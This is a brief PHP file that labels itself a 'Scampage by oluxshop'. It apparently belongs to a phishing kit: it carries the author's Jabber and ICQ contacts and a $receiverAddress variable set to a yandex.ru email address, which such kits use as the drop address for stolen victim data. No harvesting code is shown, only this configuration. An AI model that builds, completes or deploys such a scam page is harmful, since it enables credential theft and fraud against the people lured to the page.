<?php
/*
 * Scampage by oluxshop
 * Jabber: dayandnightwalker@yandex.ru
 * ICQ: 724691041
 */

$receiverAddress = "dayandnightwalker@yandex.ru";


?>